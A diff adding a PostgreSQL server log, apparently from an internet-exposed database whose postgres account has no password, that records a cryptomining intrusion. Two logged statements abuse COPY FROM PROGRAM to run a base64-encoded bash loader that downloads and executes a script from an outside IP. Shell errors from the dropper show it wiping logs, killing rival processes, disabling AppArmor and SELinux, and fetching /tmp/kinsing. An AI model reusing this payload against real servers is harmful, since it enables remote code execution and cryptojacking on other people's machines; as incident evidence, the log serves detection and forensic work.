@@ -1,0 +1,487 @@
+2023-03-28 07:50:12.657 UTC [4812] LOG:  starting PostgreSQL 14.7 (Ubuntu 14.7-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, 64-bit
+2023-03-28 07:50:12.659 UTC [4812] LOG:  listening on IPv4 address "127.0.0.1", port 5432
+2023-03-28 07:50:12.661 UTC [4812] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+2023-03-28 07:50:12.667 UTC [4813] LOG:  database system was shut down at 2023-03-28 07:50:11 UTC
+2023-03-28 07:50:12.673 UTC [4812] LOG:  database system is ready to accept connections
+2023-03-28 07:54:49.249 UTC [4812] LOG:  received fast shutdown request
+2023-03-28 07:54:49.251 UTC [4812] LOG:  aborting any active transactions
+2023-03-28 07:54:49.258 UTC [4812] LOG:  background worker "logical replication launcher" (PID 4819) exited with exit code 1
+2023-03-28 07:54:49.259 UTC [4814] LOG:  shutting down
+2023-03-28 07:54:49.278 UTC [4812] LOG:  database system is shut down
+2023-03-28 07:54:49.440 UTC [4947] LOG:  starting PostgreSQL 14.7 (Ubuntu 14.7-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, 64-bit
+2023-03-28 07:54:49.440 UTC [4947] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+2023-03-28 07:54:49.440 UTC [4947] LOG:  listening on IPv6 address "::", port 5432
+2023-03-28 07:54:49.442 UTC [4947] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+2023-03-28 07:54:49.448 UTC [4948] LOG:  database system was shut down at 2023-03-28 07:54:49 UTC
+2023-03-28 07:54:49.455 UTC [4947] LOG:  database system is ready to accept connections
+2023-03-28 07:57:28.391 UTC [4987] postgres@postgres FATAL:  password authentication failed for user "postgres"
+2023-03-28 07:57:28.391 UTC [4987] postgres@postgres DETAIL:  User "postgres" has no password assigned.
+	Connection matched pg_hba.conf line 97: "host    all             all             0.0.0.0/0               md5"
+2023-03-28 07:57:28.526 UTC [4988] postgres@postgres FATAL:  password authentication failed for user "postgres"
+2023-03-28 07:57:28.526 UTC [4988] postgres@postgres DETAIL:  User "postgres" has no password assigned.
+	Connection matched pg_hba.conf line 97: "host    all             all             0.0.0.0/0               md5"
+2023-03-28 10:56:30.827 UTC [13187] [unknown]@[unknown] LOG:  could not receive data from client: Connection reset by peer
+2023-03-28 10:58:50.659 UTC [13198] [unknown]@[unknown] LOG:  could not receive data from client: Connection reset by peer
+2023-03-28 11:01:13.644 UTC [13209] [unknown]@[unknown] LOG:  could not receive data from client: Connection reset by peer
+2023-03-28 12:16:25.801 UTC [13545] postgres@value1-user LOG:  could not receive data from client: Connection reset by peer
+2023-03-28 12:16:25.803 UTC [13544] postgres@postgres LOG:  could not receive data from client: Connection reset by peer
+2023-03-28 12:25:05.718 UTC [4947] LOG:  received fast shutdown request
+2023-03-28 12:25:05.730 UTC [4947] LOG:  aborting any active transactions
+2023-03-28 12:25:05.740 UTC [14004] postgres@value1-user FATAL:  terminating connection due to administrator command
+2023-03-28 12:25:05.750 UTC [5009] postgres@value1-user FATAL:  terminating connection due to administrator command
+2023-03-28 12:25:05.751 UTC [5005] postgres@postgres FATAL:  terminating connection due to administrator command
+2023-03-28 12:25:05.759 UTC [14002] postgres@postgres FATAL:  terminating connection due to administrator command
+2023-03-28 12:25:05.819 UTC [4947] LOG:  background worker "logical replication launcher" (PID 4954) exited with exit code 1
+2023-03-28 12:25:05.884 UTC [4949] LOG:  shutting down
+2023-03-28 12:25:05.970 UTC [4947] LOG:  database system is shut down
+2023-03-28 12:25:49.523 UTC [546] LOG:  starting PostgreSQL 14.7 (Ubuntu 14.7-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, 64-bit
+2023-03-28 12:25:49.525 UTC [546] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+2023-03-28 12:25:49.525 UTC [546] LOG:  listening on IPv6 address "::", port 5432
+2023-03-28 12:25:49.532 UTC [546] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+2023-03-28 12:25:49.571 UTC [586] LOG:  database system was shut down at 2023-03-28 12:25:05 UTC
+2023-03-28 12:25:49.594 UTC [546] LOG:  database system is ready to accept connections
+2023-03-28 12:55:10.231 UTC [3337] ubuntu@ubuntu FATAL:  role "ubuntu" does not exist
+2023-03-28 13:27:55.255 UTC [4481] postgres@value1-user ERROR:  duplicate key value violates unique constraint "users_pkey"
+2023-03-28 13:27:55.255 UTC [4481] postgres@value1-user DETAIL:  Key (id)=(zhl6rv1OFeZ22PPeHuBfSXMF3DN2) already exists.
+2023-03-28 13:27:55.255 UTC [4481] postgres@value1-user STATEMENT:  INSERT INTO users (id, unique_id, user_type, phone, is_premium_member, subscribed_plan, created_at, last_accessed) VALUES ($1, $2, $3, $4, $5, $6, $7, $8) returning *
+2023-03-28 13:29:35.176 UTC [4489] postgres@postgres LOG:  could not receive data from client: Connection reset by peer
+2023-03-28 13:29:35.180 UTC [4494] postgres@value1-user LOG:  could not receive data from client: Connection reset by peer
+2023-03-28 13:29:35.181 UTC [4491] postgres@value1-user LOG:  could not receive data from client: Connection reset by peer
+2023-03-28 13:29:48.885 UTC [4481] postgres@value1-user ERROR:  duplicate key value violates unique constraint "users_pkey"
+2023-03-28 13:29:48.885 UTC [4481] postgres@value1-user DETAIL:  Key (id)=(lw6jdpMql9fPfnYT4AMAcyaB4ez2) already exists.
+2023-03-28 13:29:48.885 UTC [4481] postgres@value1-user STATEMENT:  INSERT INTO users (id, unique_id, user_type, phone, is_premium_member, subscribed_plan, created_at, last_accessed) VALUES ($1, $2, $3, $4, $5, $6, $7, $8) returning *
+2023-03-28 13:33:06.542 UTC [4481] postgres@value1-user ERROR:  duplicate key value violates unique constraint "users_pkey"
+2023-03-28 13:33:06.542 UTC [4481] postgres@value1-user DETAIL:  Key (id)=(lw6jdpMql9fPfnYT4AMAcyaB4ez2) already exists.
+2023-03-28 13:33:06.542 UTC [4481] postgres@value1-user STATEMENT:  INSERT INTO users (id, unique_id, user_type, phone, is_premium_member, subscribed_plan, created_at, last_accessed) VALUES ($1, $2, $3, $4, $5, $6, $7, $8) returning *
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0 16 34316   16  5536    0     0  18933      0  0:00:01 --:--:--  0:00:01 18894rm: cannot remove '/var/log/syslog': Permission denied
+chattr: Operation not permitted while setting flags on /tmp/
+chattr: Operation not permitted while setting flags on /var/tmp/
+chattr: Operation not permitted while setting flags on /var/spool/cron
+chattr: Operation not permitted while setting flags on /etc/crontab
+ERROR: You need to be root to run this script
+iptables v1.8.7 (nf_tables): Could not fetch rule set generation id: Permission denied (you must be root)
+
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+bash: line 12: /proc/sys/kernel/nmi_watchdog: Permission denied
+bash: line 13: /etc/sysctl.conf: Permission denied
+userdel: user 'akay' does not exist
+userdel: user 'vfinder' does not exist
+chattr: Permission denied while trying to stat /root/.ssh/
+chattr: Permission denied while trying to stat /root/.ssh/authorized_keys
+100 34316  100 34316    0     0  78498      0 --:--:-- --:--:-- --:--:-- 78347
+bash: line 42: netstat: command not found
+bash: line 43: netstat: command not found
+bash: line 44: netstat: command not found
+bash: line 45: netstat: command not found
+bash: line 46: netstat: command not found
+no crontab for postgres
+pkill: killing pid 618 failed: Operation not permitted
+bash: line 66: netstat: command not found
+bash: line 67: netstat: command not found
+bash: line 68: netstat: command not found
+bash: line 69: netstat: command not found
+bash: line 70: netstat: command not found
+bash: line 71: netstat: command not found
+bash: line 72: netstat: command not found
+bash: line 73: netstat: command not found
+bash: line 74: netstat: command not found
+bash: line 75: netstat: command not found
+bash: line 76: netstat: command not found
+bash: line 77: netstat: command not found
+bash: line 78: netstat: command not found
+bash: line 79: netstat: command not found
+bash: line 80: netstat: command not found
+bash: line 81: netstat: command not found
+bash: line 82: netstat: command not found
+cat: /tmp/.X11-unix/01: No such file or directory
+cat: /tmp/.X11-unix/11: No such file or directory
+cat: /tmp/.X11-unix/22: No such file or directory
+cat: /tmp/.pg_stat.0: No such file or directory
+cat: /tmp/.pg_stat.1: No such file or directory
+cat: /data/./oka.pid: No such file or directory
+2023-03-28 13:51:20.325 UTC [546] LOG:  received smart shutdown request
+2023-03-28 13:51:20.334 UTC [546] LOG:  background worker "logical replication launcher" (PID 592) exited with exit code 1
+2023-03-28 13:51:20.341 UTC [1449] postgres@postgres FATAL:  terminating connection due to administrator command
+2023-03-28 13:51:20.341 UTC [1450] postgres@value1-user FATAL:  terminating connection due to administrator command
+2023-03-28 13:51:20.344 UTC [3356] postgres@value1-user FATAL:  terminating connection due to administrator command
+2023-03-28 13:51:20.345 UTC [3366] postgres@value1-user FATAL:  terminating connection due to administrator command
+2023-03-28 13:51:20.347 UTC [5684] postgres@value1-user FATAL:  terminating connection due to administrator command
+grep: Trailing backslash
+kill: (6): Operation not permitted
+kill: (6759): No such process
+kill: (6764): No such process
+bash: line 260: netstat: command not found
+bash: line 261: netstat: command not found
+bash: line 262: netstat: command not found
+bash: line 263: netstat: command not found
+bash: line 264: netstat: command not found
+Failed to stop c3pool_miner.service: Interactive authentication required.
+See system logs and 'systemctl status c3pool_miner.service' for details.
+pkill: killing pid 541 failed: Operation not permitted
+pkill: killing pid 413 failed: Operation not permitted
+pkill: killing pid 541 failed: Operation not permitted
+log_rot: no process found
+chattr: No such file or directory while trying to stat /etc/ld.so.preload
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh.1': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh.2': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh.3': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh.1': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh.2': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh.3': No such file or directory
+rm: cannot remove '/var/tmp/lib': No such file or directory
+rm: cannot remove '/var/tmp/.lib': No such file or directory
+chattr: No such file or directory while trying to stat /tmp/lok
+chmod: cannot access '/tmp/lok': No such file or directory
+bash: line 567: docker: command not found
+bash: line 568: docker: command not found
+bash: line 569: docker: command not found
+bash: line 570: docker: command not found
+bash: line 571: docker: command not found
+bash: line 572: docker: command not found
+bash: line 573: docker: command not found
+bash: line 574: docker: command not found
+bash: line 575: docker: command not found
+bash: line 576: docker: command not found
+bash: line 577: docker: command not found
+bash: line 578: docker: command not found
+bash: line 579: docker: command not found
+bash: line 580: docker: command not found
+bash: line 581: docker: command not found
+bash: line 582: docker: command not found
+bash: line 583: docker: command not found
+bash: line 584: docker: command not found
+bash: line 585: docker: command not found
+bash: line 586: docker: command not found
+bash: line 587: docker: command not found
+bash: line 588: docker: command not found
+bash: line 589: setenforce: command not found
+bash: line 590: /etc/selinux/config: Permission denied
+Failed to stop apparmor.service: Interactive authentication required.
+See system logs and 'systemctl status apparmor.service' for details.
+Synchronizing state of apparmor.service with SysV service script with /lib/systemd/systemd-sysv-install.
+Executing: /lib/systemd/systemd-sysv-install disable apparmor
+Failed to reload daemon: Interactive authentication required.
+update-rc.d: error: Permission denied
+Failed to stop aliyun.service.service: Interactive authentication required.
+See system logs and 'systemctl status aliyun.service.service' for details.
+Failed to disable unit: Interactive authentication required.
+md5sum: /tmp/kinsing: No such file or directory
+/tmp/kinsing is not 2c44b4e4706b8bd95d1866d7867efa0e, actual 
+chmod: cannot access '/tmp/kinsing': No such file or directory
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  3 6168k    3  216k    0     0   212k      0  0:00:29  0:00:01  0:00:28  212k 66 6168k   66 4099k    0     0  2002k      0  0:00:03  0:00:02  0:00:01 2003k100 6168k  100 6168k    0     0  2622k      0  0:00:02  0:00:02 --:--:-- 2622k
+/tmp/kinsing is 2c44b4e4706b8bd95d1866d7867efa0e
+2023-03-28 13:51:29.507 UTC [5750] postgres@postgres FATAL:  terminating connection due to administrator command
+2023-03-28 13:51:29.507 UTC [5750] postgres@postgres CONTEXT:  COPY yyhuvqig, line 1: "/tmp/kinsing"
+2023-03-28 13:51:29.507 UTC [5750] postgres@postgres STATEMENT:  DROP TABLE IF EXISTS yyHuVQig;CREATE TABLE yyHuVQig(cmd_output text);COPY yyHuVQig FROM PROGRAM 'echo IyEvYmluL2Jhc2gKcGtpbGwgLWYgenN2Ywpwa2lsbCAtZiBwZGVmZW5kZXJkCnBraWxsIC1mIHVwZGF0ZWNoZWNrZXJkCgpmdW5jdGlvbiBfX2N1cmwoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwkKGVjaG8gJHsxLy8vLyB9KQogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKCiAgZXhlYyAzPD4vZGV2L3RjcC8ke0hPU1R9LyRQT1JUCiAgZWNobyAtZW4gIkdFVCAke0RPQ30gSFRUUC8xLjBcclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKICAod2hpbGUgcmVhZCBsaW5lOyBkbwogICBbWyAiJGxpbmUiID09ICQnXHInIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgppZiBbIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIF07IHRoZW4KICBjdXJsIDE5NC4zOC4yMC4yMjUvcGcuc2h8YmFzaAplbGlmIFsgLXggIiQoY29tbWFuZCAtdiB3Z2V0KSIgXTsgdGhlbgogIHdnZXQgLXEgLU8tIDE5NC4zOC4yMC4yMjUvcGcuc2h8YmFzaAplbHNlCiAgX19jdXJsIGh0dHA6Ly8xOTQuMzguMjAuMjI1L3BnMi5zaHxiYXNoCmZp|base64 -d|bash';SELECT * FROM yyHuVQig;DROP TABLE IF EXISTS yyHuVQig;
+2023-03-28 13:51:29.516 UTC [587] LOG:  shutting down
+2023-03-28 13:51:29.542 UTC [546] LOG:  database system is shut down
+2023-03-28 13:55:19.420 UTC [8172] LOG:  starting PostgreSQL 14.7 (Ubuntu 14.7-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, 64-bit
+2023-03-28 13:55:19.420 UTC [8172] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+2023-03-28 13:55:19.420 UTC [8172] LOG:  listening on IPv6 address "::", port 5432
+2023-03-28 13:55:19.422 UTC [8172] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+2023-03-28 13:55:19.433 UTC [8173] LOG:  database system was shut down at 2023-03-28 13:51:29 UTC
+2023-03-28 13:55:19.442 UTC [8172] LOG:  database system is ready to accept connections
+2023-03-28 13:55:29.997 UTC [8194] [unknown]@[unknown] LOG:  invalid length of startup packet
+2023-03-28 13:55:30.429 UTC [8195] [unknown]@[unknown] LOG:  invalid length of startup packet
+2023-03-28 13:55:30.847 UTC [8196] [unknown]@[unknown] LOG:  invalid length of startup packet
+2023-03-28 13:55:31.262 UTC [8197] [unknown]@[unknown] LOG:  invalid length of startup packet
+2023-03-28 13:55:31.679 UTC [8198] [unknown]@[unknown] LOG:  invalid length of startup packet
+2023-03-28 13:55:32.100 UTC [8199] [unknown]@[unknown] LOG:  invalid length of startup packet
+2023-03-28 13:55:32.516 UTC [8200] [unknown]@[unknown] LOG:  invalid length of startup packet
+2023-03-28 13:55:32.934 UTC [8201] [unknown]@[unknown] LOG:  invalid length of startup packet
+2023-03-28 13:55:33.354 UTC [8202] [unknown]@[unknown] LOG:  invalid length of startup packet
+2023-03-28 13:55:33.775 UTC [8203] [unknown]@[unknown] LOG:  invalid length of startup packet
+2023-03-28 14:07:28.082 UTC [8193] postgres@value1-user ERROR:  duplicate key value violates unique constraint "users_pkey"
+2023-03-28 14:07:28.082 UTC [8193] postgres@value1-user DETAIL:  Key (id)=(lw6jdpMql9fPfnYT4AMAcyaB4ez2) already exists.
+2023-03-28 14:07:28.082 UTC [8193] postgres@value1-user STATEMENT:  INSERT INTO users (id, unique_id, user_type, phone, is_premium_member, subscribed_plan, created_at, last_accessed) VALUES ($1, $2, $3, $4, $5, $6, $7, $8) returning *
+2023-03-28 14:37:28.314 UTC [9905] postgres@postgres FATAL:  password authentication failed for user "postgres"
+2023-03-28 14:37:28.314 UTC [9905] postgres@postgres DETAIL:  Connection matched pg_hba.conf line 97: "host    all             all             0.0.0.0/0               md5"
+2023-03-28 15:56:14.575 UTC [10626] [unknown]@[unknown] FATAL:  unsupported frontend protocol 0.0: server supports 3.0 to 3.0
+2023-03-28 15:56:15.071 UTC [10627] [unknown]@[unknown] FATAL:  unsupported frontend protocol 255.255: server supports 3.0 to 3.0
+2023-03-28 15:56:15.569 UTC [10628] [unknown]@[unknown] FATAL:  no PostgreSQL user name specified in startup packet
+2023-03-28 15:58:08.616 UTC [8217] postgres@value1-user LOG:  could not receive data from client: Connection reset by peer
+2023-03-28 15:58:08.620 UTC [8213] postgres@postgres LOG:  could not receive data from client: Connection reset by peer
+2023-03-28 16:12:52.123 UTC [10768] [unknown]@[unknown] LOG:  could not accept SSL connection: unsupported protocol
+2023-03-28 16:12:52.123 UTC [10768] [unknown]@[unknown] HINT:  This may indicate that the client does not support any SSL protocol version between TLSv1.2 and TLSv1.3.
+2023-03-28 19:18:03.366 UTC [8172] LOG:  received smart shutdown request
+2023-03-28 19:18:03.373 UTC [8172] LOG:  background worker "logical replication launcher" (PID 8179) exited with exit code 1
+2023-03-28 19:18:03.381 UTC [8193] postgres@value1-user FATAL:  terminating connection due to administrator command
+2023-03-28 19:18:03.427 UTC [8174] LOG:  shutting down
+2023-03-28 19:18:03.483 UTC [8172] LOG:  database system is shut down
+2023-03-29 05:14:49.955 UTC [624] LOG:  starting PostgreSQL 14.7 (Ubuntu 14.7-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, 64-bit
+2023-03-29 05:14:49.957 UTC [624] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+2023-03-29 05:14:49.957 UTC [624] LOG:  listening on IPv6 address "::", port 5432
+2023-03-29 05:14:49.960 UTC [624] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+2023-03-29 05:14:49.991 UTC [667] LOG:  database system was shut down at 2023-03-28 19:18:03 UTC
+2023-03-29 05:14:50.026 UTC [624] LOG:  database system is ready to accept connections
+2023-03-29 05:21:40.478 UTC [922] postgres@value1-user ERROR:  duplicate key value violates unique constraint "users_pkey"
+2023-03-29 05:21:40.478 UTC [922] postgres@value1-user DETAIL:  Key (id)=(zhl6rv1OFeZ22PPeHuBfSXMF3DN2) already exists.
+2023-03-29 05:21:40.478 UTC [922] postgres@value1-user STATEMENT:  INSERT INTO users (id, unique_id, user_type, phone, is_premium_member, subscribed_plan, created_at, last_accessed) VALUES ($1, $2, $3, $4, $5, $6, $7, $8) returning *
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0rm: cannot remove '/var/log/syslog': Permission denied
+chattr: Operation not permitted while setting flags on /tmp/
+chattr: Operation not permitted while setting flags on /var/tmp/
+chattr: Operation not permitted while setting flags on /var/spool/cron
+chattr: Operation not permitted while setting flags on /etc/crontab
+ERROR: You need to be root to run this script
+iptables v1.8.7 (nf_tables): Could not fetch rule set generation id: Permission denied (you must be root)
+
+sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+sudo: a password is required
+bash: line 12: /proc/sys/kernel/nmi_watchdog: Permission denied
+bash: line 13: /etc/sysctl.conf: Permission denied
+userdel: user 'akay' does not exist
+userdel: user 'vfinder' does not exist
+chattr: Permission denied while trying to stat /root/.ssh/
+chattr: Permission denied while trying to stat /root/.ssh/authorized_keys
+ 92 34316   92 31600    0     0  65203      0 --:--:-- --:--:-- --:--:-- 65154100 34316  100 34316    0     0  70781      0 --:--:-- --:--:-- --:--:-- 70754
+bash: line 42: netstat: command not found
+bash: line 43: netstat: command not found
+bash: line 44: netstat: command not found
+bash: line 45: netstat: command not found
+bash: line 46: netstat: command not found
+pkill: killing pid 705 failed: Operation not permitted
+pkill: killing pid 936 failed: Operation not permitted
+pkill: killing pid 1364 failed: Operation not permitted
+bash: line 66: netstat: command not found
+bash: line 67: netstat: command not found
+bash: line 68: netstat: command not found
+bash: line 69: netstat: command not found
+bash: line 70: netstat: command not found
+bash: line 71: netstat: command not found
+bash: line 72: netstat: command not found
+bash: line 73: netstat: command not found
+bash: line 74: netstat: command not found
+bash: line 75: netstat: command not found
+bash: line 76: netstat: command not found
+bash: line 77: netstat: command not found
+bash: line 78: netstat: command not found
+bash: line 79: netstat: command not found
+bash: line 80: netstat: command not found
+bash: line 81: netstat: command not found
+bash: line 82: netstat: command not found
+cat: /tmp/.X11-unix/01: No such file or directory
+cat: /tmp/.X11-unix/11: No such file or directory
+cat: /tmp/.X11-unix/22: No such file or directory
+cat: /tmp/.pg_stat.0: No such file or directory
+cat: /tmp/.pg_stat.1: No such file or directory
+cat: /data/./oka.pid: No such file or directory
+2023-03-29 05:26:16.238 UTC [624] LOG:  received smart shutdown request
+2023-03-29 05:26:16.247 UTC [624] LOG:  background worker "logical replication launcher" (PID 677) exited with exit code 1
+pkill: killing pid 1670 failed: Operation not permitted
+pkill: killing pid 1671 failed: Operation not permitted
+pkill: killing pid 1672 failed: Operation not permitted
+2023-03-29 05:26:16.249 UTC [922] postgres@value1-user FATAL:  terminating connection due to administrator command
+grep: Trailing backslash
+kill: (6): Operation not permitted
+kill: (2734): No such process
+kill: (2739): No such process
+bash: line 260: netstat: command not found
+bash: line 261: netstat: command not found
+bash: line 262: netstat: command not found
+bash: line 263: netstat: command not found
+bash: line 264: netstat: command not found
+Failed to stop c3pool_miner.service: Interactive authentication required.
+See system logs and 'systemctl status c3pool_miner.service' for details.
+pkill: killing pid 630 failed: Operation not permitted
+pkill: killing pid 490 failed: Operation not permitted
+pkill: killing pid 630 failed: Operation not permitted
+log_rot: no process found
+chattr: No such file or directory while trying to stat /etc/ld.so.preload
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh.1': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh.2': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/1.sh.3': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh.1': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh.2': No such file or directory
+rm: cannot remove '/opt/atlassian/confluence/bin/3.sh.3': No such file or directory
+rm: cannot remove '/var/tmp/lib': No such file or directory
+rm: cannot remove '/var/tmp/.lib': No such file or directory
+chattr: No such file or directory while trying to stat /tmp/lok
+chmod: cannot access '/tmp/lok': No such file or directory
+bash: line 567: docker: command not found
+bash: line 568: docker: command not found
+bash: line 569: docker: command not found
+bash: line 570: docker: command not found
+bash: line 571: docker: command not found
+bash: line 572: docker: command not found
+bash: line 573: docker: command not found
+bash: line 574: docker: command not found
+bash: line 575: docker: command not found
+bash: line 576: docker: command not found
+bash: line 577: docker: command not found
+bash: line 578: docker: command not found
+bash: line 579: docker: command not found
+bash: line 580: docker: command not found
+bash: line 581: docker: command not found
+bash: line 582: docker: command not found
+bash: line 583: docker: command not found
+bash: line 584: docker: command not found
+bash: line 585: docker: command not found
+bash: line 586: docker: command not found
+bash: line 587: docker: command not found
+bash: line 588: docker: command not found
+bash: line 589: setenforce: command not found
+bash: line 590: /etc/selinux/config: Permission denied
+Failed to stop apparmor.service: Interactive authentication required.
+See system logs and 'systemctl status apparmor.service' for details.
+Synchronizing state of apparmor.service with SysV service script with /lib/systemd/systemd-sysv-install.
+Executing: /lib/systemd/systemd-sysv-install disable apparmor
+Failed to reload daemon: Interactive authentication required.
+update-rc.d: error: Permission denied
+Failed to stop aliyun.service.service: Interactive authentication required.
+See system logs and 'systemctl status aliyun.service.service' for details.
+Failed to disable unit: Interactive authentication required.
+md5sum: /tmp/kinsing: No such file or directory
+/tmp/kinsing is not 2c44b4e4706b8bd95d1866d7867efa0e, actual 
+chmod: cannot access '/tmp/kinsing': No such file or directory
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
+                                 Dload  Upload   Total   Spent    Left  Speed
+  0     0    0     0    0     0      0      0 --:--:-- --:--:-- --:--:--     0  2 6168k    2  152k    0     0   154k      0  0:00:39 --:--:--  0:00:39  154k 80 6168k   80 4985k    0     0  2521k      0  0:00:02  0:00:01  0:00:01 2521k100 6168k  100 6168k    0     0  3070k      0  0:00:02  0:00:02 --:--:-- 3071k
+/tmp/kinsing is 2c44b4e4706b8bd95d1866d7867efa0e
+2023-03-29 05:26:25.289 UTC [1726] postgres@postgres FATAL:  terminating connection due to administrator command
+2023-03-29 05:26:25.289 UTC [1726] postgres@postgres CONTEXT:  COPY cuyjjwet, line 1: "/tmp/kinsing"
+2023-03-29 05:26:25.289 UTC [1726] postgres@postgres STATEMENT:  DROP TABLE IF EXISTS cUYjJWeT;CREATE TABLE cUYjJWeT(cmd_output text);COPY cUYjJWeT FROM PROGRAM 'echo IyEvYmluL2Jhc2gKcGtpbGwgLWYgenN2Ywpwa2lsbCAtZiBwZGVmZW5kZXJkCnBraWxsIC1mIHVwZGF0ZWNoZWNrZXJkCgpmdW5jdGlvbiBfX2N1cmwoKSB7CiAgcmVhZCBwcm90byBzZXJ2ZXIgcGF0aCA8PDwkKGVjaG8gJHsxLy8vLyB9KQogIERPQz0vJHtwYXRoLy8gLy99CiAgSE9TVD0ke3NlcnZlci8vOip9CiAgUE9SVD0ke3NlcnZlci8vKjp9CiAgW1sgeCIke0hPU1R9IiA9PSB4IiR7UE9SVH0iIF1dICYmIFBPUlQ9ODAKCiAgZXhlYyAzPD4vZGV2L3RjcC8ke0hPU1R9LyRQT1JUCiAgZWNobyAtZW4gIkdFVCAke0RPQ30gSFRUUC8xLjBcclxuSG9zdDogJHtIT1NUfVxyXG5cclxuIiA+JjMKICAod2hpbGUgcmVhZCBsaW5lOyBkbwogICBbWyAiJGxpbmUiID09ICQnXHInIF1dICYmIGJyZWFrCiAgZG9uZSAmJiBjYXQpIDwmMwogIGV4ZWMgMz4mLQp9CgppZiBbIC14ICIkKGNvbW1hbmQgLXYgY3VybCkiIF07IHRoZW4KICBjdXJsIDE5NC4zOC4yMC4yMjUvcGcuc2h8YmFzaAplbGlmIFsgLXggIiQoY29tbWFuZCAtdiB3Z2V0KSIgXTsgdGhlbgogIHdnZXQgLXEgLU8tIDE5NC4zOC4yMC4yMjUvcGcuc2h8YmFzaAplbHNlCiAgX19jdXJsIGh0dHA6Ly8xOTQuMzguMjAuMjI1L3BnMi5zaHxiYXNoCmZp|base64 -d|bash';SELECT * FROM cUYjJWeT;DROP TABLE IF EXISTS cUYjJWeT;
+2023-03-29 05:26:25.298 UTC [672] LOG:  shutting down
+2023-03-29 05:26:25.320 UTC [624] LOG:  database system is shut down
+2023-03-29 05:31:17.837 UTC [3473] LOG:  starting PostgreSQL 14.7 (Ubuntu 14.7-0ubuntu0.22.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 11.3.0-1ubuntu1~22.04) 11.3.0, 64-bit
+2023-03-29 05:31:17.837 UTC [3473] LOG:  listening on IPv4 address "0.0.0.0", port 5432
+2023-03-29 05:31:17.837 UTC [3473] LOG:  listening on IPv6 address "::", port 5432
+2023-03-29 05:31:17.840 UTC [3473] LOG:  listening on Unix socket "/var/run/postgresql/.s.PGSQL.5432"
+2023-03-29 05:31:17.847 UTC [3474] LOG:  database system was shut down at 2023-03-29 05:26:25 UTC
+2023-03-29 05:31:17.853 UTC [3473] LOG:  database system is ready to accept connections
+2023-03-29 05:31:32.647 UTC [3495] postgres@value1-user ERROR:  duplicate key value violates unique constraint "users_pkey"
+2023-03-29 05:31:32.647 UTC [3495] postgres@value1-user DETAIL:  Key (id)=(zhl6rv1OFeZ22PPeHuBfSXMF3DN2) already exists.
+2023-03-29 05:31:32.647 UTC [3495] postgres@value1-user STATEMENT:  INSERT INTO users (id, unique_id, user_type, phone, is_premium_member, subscribed_plan, created_at, last_accessed) VALUES ($1, $2, $3, $4, $5, $6, $7, $8) returning *
+2023-03-29 05:47:16.846 UTC [3495] postgres@value1-user ERROR:  duplicate key value violates unique constraint "users_pkey"
+2023-03-29 05:47:16.846 UTC [3495] postgres@value1-user DETAIL:  Key (id)=(zhl6rv1OFeZ22PPeHuBfSXMF3DN2) already exists.
